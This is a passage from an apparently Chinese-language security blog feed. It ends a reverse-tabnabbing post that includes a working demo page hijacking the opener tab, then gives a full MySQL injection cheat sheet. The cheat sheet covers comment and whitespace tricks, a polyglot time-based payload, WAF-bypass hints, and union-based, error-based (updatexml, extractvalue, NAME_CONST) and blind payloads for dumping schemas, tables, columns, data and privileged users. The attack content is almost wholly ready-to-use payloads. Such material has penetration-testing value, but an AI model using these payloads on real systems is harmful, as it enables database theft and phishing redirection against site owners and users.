<p><img src="https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png"></p>
<h3 id="Without-back-link"><a href="#Without-back-link" class="headerlink" title="Without back link"></a>Without back link</h3><p>使用 <code>rel=&quot;noopener&quot;</code> 或 <code>rel=&quot;noreferrer&quot;</code> 属性时父页面和子页面之间的链接：</p>
<p><img src="https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png"></p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例 "></a>示例 <a href="#examples" id="examples"></a></h3><p>在文件夹中创建以下页面并使用 <code>python3 -m http.server</code> 运行 Web 服务器<br>然后，访问 <code>http://127.0.0.1:8000/vulnerable.html</code>，点击链接并观察 <strong>原始Tab</strong> 的 URL 变化。</p>
<ul>
<li><p><strong>vulnerable.html</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Victim Site<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1:8000/malicious.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;opener&quot;</span>&gt;</span>Controlled by the attacker<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>malicious.html</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">location</span> = <span class="string">&quot;http://127.0.0.1:8000/malicious_redir.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>malicious_redir.html</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>New Malicious Site<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="可访问的属性"><a href="#可访问的属性" class="headerlink" title="可访问的属性 "></a>可访问的属性 <a href="#accessible-properties" id="accessible-properties"></a></h3><p>在跨域访问的情况下，恶意站点只能从 <strong>window.opener</strong> javascript 对象引用(这实际上是一个<strong>Window</strong> javascript类实例的引用)访问以下属性:</p>
<ul>
<li><code>opener.closed</code>: Returns a boolean value indicating whether a window has been closed or not.</li>
<li><code>opener.frames</code>: Returns all iframe elements in the current window.</li>
<li><code>opener.length</code>: Returns the number of iframe elements in the current window.</li>
<li><code>opener.opener</code>: Returns a reference to the window that created the window.</li>
<li><code>opener.parent</code>: Returns the parent window of the current window.</li>
<li><code>opener.self</code>: Returns the current window.</li>
<li><code>opener.top</code>: Returns the topmost browser window.</li>
</ul>
<p>如果域是相同的，那么恶意站点可以访问由<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window"><strong>window</strong></a> javascript对象引用的所有属性。</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>防御内容在 <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#tabnabbing">HTML5 备忘单</a> 中。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://owasp.org/www-community/attacks/Reverse_Tabnabbing">https://owasp.org/www-community/attacks/Reverse_Tabnabbing</a></p>
<hr>
]]></content>
      <categories>
        <category>钓鱼</category>
      </categories>
      <tags>
        <tag>钓鱼</tag>
        <tag>Reverse Tab Nabbing</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 注入备忘录</title>
    <url>/2022/04/17/MySQL-%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<h1 id="MySQL-injection"><a href="#MySQL-injection" class="headerlink" title="MySQL injection"></a>MySQL injection</h1><p><strong>这是如何确认和执行 MySQL 注入的基本流程。欲了解更多信息，请访问:</strong> <a href="https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md"><strong>https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md</strong></a></p>
<h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- MYSQL Comment</span></span><br><span class="line"># MYSQL Comment</span><br><span class="line"><span class="comment">/* MYSQL Comment */</span></span><br><span class="line"><span class="comment">/*! MYSQL Special SQL */</span></span><br><span class="line"><span class="comment">/*!32302 10*/</span> Comment <span class="keyword">for</span> MySQL version <span class="number">3.23</span><span class="number">.02</span></span><br><span class="line"><span class="comment">/*!50726 select version()*/</span> 向低版本兼容执行。<span class="operator">&lt;=</span> <span class="number">5.7</span><span class="number">.26</span> ，执行<span class="keyword">SQL</span>语句 。<span class="operator">&gt;</span> <span class="number">5.7</span><span class="number">.26</span> 作为注释符使用。</span><br></pre></td></tr></table></figure>

<h2 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">09</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>A</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>B</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>C</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>D</span><br><span class="line"><span class="operator">%</span><span class="number">20</span></span><br></pre></td></tr></table></figure>

<h2 id="MySQL-注入常用函数汇总"><a href="#MySQL-注入常用函数汇总" class="headerlink" title="MySQL 注入常用函数汇总"></a>MySQL 注入常用函数汇总</h2><h3 id="确认数据库类型为-Mysql-的函数"><a href="#确认数据库类型为-Mysql-的函数" class="headerlink" title="确认数据库类型为 Mysql 的函数"></a>确认数据库类型为 Mysql 的函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">concat(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">database()</span><br><span class="line">version()</span><br><span class="line"><span class="keyword">user</span>()</span><br><span class="line"><span class="built_in">system_user</span>()</span><br><span class="line">@<span class="variable">@version</span></span><br><span class="line">@<span class="variable">@datadir</span></span><br><span class="line">rand()</span><br><span class="line"><span class="built_in">floor</span>(<span class="number">2.9</span>)</span><br><span class="line">length(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">count</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="MySQL-注入使用-函数"><a href="#MySQL-注入使用-函数" class="headerlink" title="MySQL 注入使用 函数"></a>MySQL 注入使用 函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> hex(database())</span><br><span class="line"><span class="keyword">SELECT</span> conv(hex(database()),<span class="number">16</span>,<span class="number">10</span>) # <span class="number">16</span> 进制 <span class="operator">-</span><span class="operator">&gt;</span> <span class="number">10</span> 进制</span><br><span class="line"><span class="keyword">SELECT</span> DECODE(ENCODE(<span class="string">&#x27;cleartext&#x27;</span>, <span class="string">&#x27;PWD&#x27;</span>), <span class="string">&#x27;PWD&#x27;</span>) # Encode() <span class="operator">&amp;</span> decpde() <span class="keyword">returns</span> <span class="keyword">only</span> numbers</span><br><span class="line"><span class="keyword">SELECT</span> uncompress(compress(database())) # Compress <span class="operator">&amp;</span> uncompress() <span class="keyword">returns</span> <span class="keyword">only</span> numbers</span><br><span class="line"><span class="keyword">SELECT</span> replace(database(),&quot;r&quot;,&quot;R&quot;)</span><br><span class="line"><span class="keyword">SELECT</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x72</span></span><br><span class="line"><span class="keyword">SELECT</span> ascii(<span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span></span><br><span class="line"><span class="keyword">SELECT</span> database()<span class="operator">=</span><span class="type">char</span>(<span class="number">114</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">114</span>)</span><br><span class="line"><span class="keyword">SELECT</span> group_concat(<span class="operator">&lt;</span><span class="keyword">COLUMN</span><span class="operator">&gt;</span>) <span class="keyword">FROM</span> <span class="operator">&lt;</span><span class="keyword">TABLE</span><span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">SELECT</span> group_concat(if(strcmp(table_schema,database()),table_name,<span class="keyword">null</span>))</span><br><span class="line"><span class="keyword">SELECT</span> group_concat(<span class="keyword">CASE</span>(table_schema)<span class="keyword">When</span>(database())<span class="keyword">Then</span>(table_name)<span class="keyword">END</span>)</span><br><span class="line"></span><br><span class="line">group_concat() <span class="operator">=</span> <span class="number">1024</span> symbols</span><br><span class="line"><span class="built_in">json_arrayagg</span>() <span class="operator">&gt;</span> <span class="number">16</span>,<span class="number">000</span>,<span class="number">000</span> symbols</span><br><span class="line"></span><br><span class="line"># 盲注相关函数</span><br><span class="line"></span><br><span class="line">## 字符串比较、截取</span><br><span class="line">strcmp()</span><br><span class="line">mid()</span><br><span class="line">ldap()</span><br><span class="line">rdap()</span><br><span class="line"><span class="keyword">left</span>()</span><br><span class="line">rigth()</span><br><span class="line">instr()</span><br><span class="line">make_set()</span><br><span class="line"></span><br><span class="line">## 表达式比较 </span><br><span class="line">if(<span class="built_in">abs</span>(strcmp((ascii(mid(<span class="keyword">user</span>()<span class="keyword">from</span>(<span class="number">1</span>)<span class="keyword">for</span>(<span class="number">2</span>)))),<span class="number">114</span>))<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">find_in_set()</span><br><span class="line">regexp</span><br><span class="line">least(ord(<span class="string">&#x27;r&#x27;</span>),<span class="number">115</span>)、greatest(ord(<span class="string">&#x27;r&#x27;</span>),<span class="number">113</span>)</span><br><span class="line"><span class="keyword">between</span> n <span class="keyword">and</span> m</span><br><span class="line"></span><br><span class="line">## 时间相关函数</span><br><span class="line">sleep()</span><br><span class="line">BENCHMARK(<span class="number">40000000</span>,SHA1(<span class="number">1337</span>))</span><br><span class="line"><span class="keyword">OR</span> ELT([RANDNUM]<span class="operator">=</span>[RANDNUM],SLEEP([SLEEPTIME]))</span><br></pre></td></tr></table></figure>

<h2 id="全适用-Payload"><a href="#全适用-Payload" class="headerlink" title="全适用 Payload"></a>全适用 Payload</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> some_table <span class="keyword">WHERE</span> double_quotes <span class="operator">=</span> &quot;IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*&#x27;XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR&#x27;|&quot;XOR(IF(SUBSTR(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&lt;</span><span class="number">5</span>,BENCHMARK(<span class="number">2000000</span>,SHA1(<span class="number">0xDE7EC71F1</span>)),SLEEP(<span class="number">1</span>)))<span class="keyword">OR</span>&quot;*/&quot;</span><br></pre></td></tr></table></figure>

<p>from <a href="https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/">https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/</a></p>
<h2 id="Mysql-注入流程"><a href="#Mysql-注入流程" class="headerlink" title="Mysql 注入流程"></a>Mysql 注入流程</h2><p>Remember that in “modern” versions of <strong>MySQL</strong> you can substitute “<em><strong>information_schema.tables</strong></em>“ for “<em><strong>mysql.innodb_table_stats</strong></em><strong>“</strong> (This could be useful to bypass WAFs).</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database();#<span class="keyword">Get</span> name <span class="keyword">of</span> the tables</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span>&quot;&lt;TABLE_NAME&gt;&quot;; #<span class="keyword">Get</span> name <span class="keyword">of</span> the columns <span class="keyword">of</span> the <span class="keyword">table</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">&lt;</span>COLUMN1<span class="operator">&gt;</span>,<span class="operator">&lt;</span>COLUMN2<span class="operator">&gt;</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>TABLE_NAME<span class="operator">&gt;</span>; #<span class="keyword">Get</span> <span class="keyword">values</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> file_priv<span class="operator">=</span><span class="string">&#x27;Y&#x27;</span>; #Users <span class="keyword">with</span> file privileges</span><br></pre></td></tr></table></figure>

<h3 id="Only-1-value"><a href="#Only-1-value" class="headerlink" title="Only 1 value"></a><strong>Only 1 value</strong></h3><ul>
<li><code>group_concat()</code></li>
<li><code>Limit X,1</code></li>
</ul>
<h3 id="Blind-one-by-one"><a href="#Blind-one-by-one" class="headerlink" title="Blind one by one"></a><strong>Blind one by one</strong></h3><ul>
<li><code>substr(version(),X,1)=&#39;r&#39;</code> or <code>substring(version(),X,1)=0x70</code> or <code>ascii(substr(version(),X,1))=112</code></li>
<li><code>mid(version(),X,1)=&#39;5&#39;</code></li>
</ul>
<h3 id="Blind-adding"><a href="#Blind-adding" class="headerlink" title="Blind adding"></a><strong>Blind adding</strong></h3><ul>
<li><code>LPAD(version(),1...lenght(version()),&#39;1&#39;)=&#39;asd&#39;...</code></li>
<li><code>RPAD(version(),1...lenght(version()),&#39;1&#39;)=&#39;asd&#39;...</code></li>
<li><code>SELECT RIGHT(version(),1...lenght(version()))=&#39;asd&#39;...</code></li>
<li><code>SELECT LEFT(version(),1...lenght(version()))=&#39;asd&#39;...</code></li>
<li><code>SELECT INSTR(&#39;foobarbar&#39;, &#39;fo...&#39;)=1</code></li>
</ul>
<h2 id="Detect-number-of-columns-amp-x20"><a href="#Detect-number-of-columns-amp-x20" class="headerlink" title="Detect number of columns&amp;#x20;"></a>Detect number of columns&amp;#x20;</h2><p>Using a simple ORDER</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 1</span><br><span class="line">order by 2</span><br><span class="line">order by 3</span><br><span class="line">...</span><br><span class="line">order by XXX</span><br><span class="line"></span><br><span class="line">UniOn SeLect 1</span><br><span class="line">UniOn SeLect 1,2</span><br><span class="line">UniOn SeLect 1,2,3</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-Union-Based"><a href="#MySQL-Union-Based" class="headerlink" title="MySQL Union Based"></a>MySQL Union Based</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,schema_name,<span class="number">0x7c</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>information_schema.schemata</span><br><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,table_name,<span class="number">0x7C</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>information_schema.tables<span class="operator">+</span><span class="keyword">wHeRe</span><span class="operator">+</span>table_schema<span class="operator">=</span>...</span><br><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,column_name,<span class="number">0x7C</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>information_schema.columns<span class="operator">+</span><span class="keyword">wHeRe</span><span class="operator">+</span>table_name<span class="operator">=</span>...</span><br><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,data,<span class="number">0x7C</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>...</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Error-Based"><a href="#MYSQL-Error-Based" class="headerlink" title="MYSQL Error Based"></a>MYSQL Error Based</h2><h3 id="MYSQL-Error-Based-Basic"><a href="#MYSQL-Error-Based-Basic" class="headerlink" title="MYSQL Error Based - Basic"></a>MYSQL Error Based - Basic</h3><p><strong>Works with MySQL &gt;&#x3D; 4.1</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(CONCAT(@<span class="variable">@VERSION</span>),<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>)a <span class="keyword">group</span> <span class="keyword">by</span> x limit <span class="number">1</span>))</span><br><span class="line"><span class="string">&#x27;+(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="MYSQL-Error-Based-UpdateXML-function"><a href="#MYSQL-Error-Based-UpdateXML-function" class="headerlink" title="MYSQL Error Based - UpdateXML function"></a>MYSQL Error Based - UpdateXML function</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="type">CHAR</span>(<span class="number">126</span>),version(),<span class="type">CHAR</span>(<span class="number">126</span>)),<span class="keyword">null</span>)<span class="operator">-</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),schema_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.schemata LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),TABLE_NAME,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>data_column LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),column_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> TABLE_NAME<span class="operator">=</span>data_table LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),data_info,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> data_table.data_column LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>Shorter to read:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(null,concat(0x0a,version()),null)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> updatexml(<span class="keyword">null</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() LIMIT <span class="number">0</span>,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h3 id="MYSQL-Error-Based-Extractvalue-function"><a href="#MYSQL-Error-Based-Extractvalue-function" class="headerlink" title="MYSQL Error Based - Extractvalue function"></a>MYSQL Error Based - Extractvalue function</h3><p><strong>Works with MySQL &gt;&#x3D; 5.1</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="type">CHAR</span>(<span class="number">126</span>),version(),<span class="type">CHAR</span>(<span class="number">126</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),schema_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.schemata LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),TABLE_NAME,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>data_column LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),column_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> TABLE_NAME<span class="operator">=</span>data_table LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),data_info,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> data_table.data_column LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h3 id="MYSQL-Error-Based-NAME-CONST-function-only-for-constants"><a href="#MYSQL-Error-Based-NAME-CONST-function-only-for-constants" class="headerlink" title="MYSQL Error Based - NAME_CONST function (only for constants)"></a>MYSQL Error Based - NAME_CONST function (only for constants)</h3><p><strong>Works with MySQL &gt;&#x3D; 5.0</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> NAME_CONST(version(),<span class="number">1</span>),NAME_CONST(version(),<span class="number">1</span>)) <span class="keyword">as</span> x)<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> NAME_CONST(<span class="keyword">user</span>(),<span class="number">1</span>),NAME_CONST(<span class="keyword">user</span>(),<span class="number">1</span>)) <span class="keyword">as</span> x)<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> NAME_CONST(database(),<span class="number">1</span>),NAME_CONST(database(),<span class="number">1</span>)) <span class="keyword">as</span> x)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Blind"><a href="#MYSQL-Blind" class="headerlink" title="MYSQL Blind"></a>MYSQL Blind</h2><h3 id="MYSQL-Blind-with-substring-equivalent"><a href="#MYSQL-Blind-with-substring-equivalent" class="headerlink" title="MYSQL Blind with substring equivalent"></a>MYSQL Blind with substring equivalent</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">substring</span>(version(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">5</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">right</span>(<span class="keyword">left</span>(version(),<span class="number">1</span>),<span class="number">1</span>)<span class="operator">=</span><span class="number">5</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">left</span>(version(),<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">lower</span>(substr(Version(),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">51</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> mid(version(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span>)</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.tables <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(column_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.columns <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-Blind-SQL-Injection-in-ORDER-BY-clause-using-a-binary-query-and-REGEXP"><a href="#MySQL-Blind-SQL-Injection-in-ORDER-BY-clause-using-a-binary-query-and-REGEXP" class="headerlink" title="MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP"></a>MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP</h3><p>This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not. For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[...] <span class="keyword">ORDER</span> <span class="keyword">BY</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> [<span class="keyword">COLUMN</span>] <span class="keyword">FROM</span> [<span class="keyword">TABLE</span>] <span class="keyword">WHERE</span> [<span class="keyword">COLUMN</span>] REGEXP &quot;^[BRUTEFORCE CHAR BY CHAR].*&quot; <span class="keyword">AND</span> [FURTHER OPTIONS <span class="operator">/</span> CONDITIONS]) <span class="keyword">THEN</span> [<span class="keyword">ONE</span> <span class="keyword">COLUMN</span> <span class="keyword">TO</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span>] <span class="keyword">ELSE</span> [ANOTHER <span class="keyword">COLUMN</span> <span class="keyword">TO</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span>] <span class="keyword">END</span>)); <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

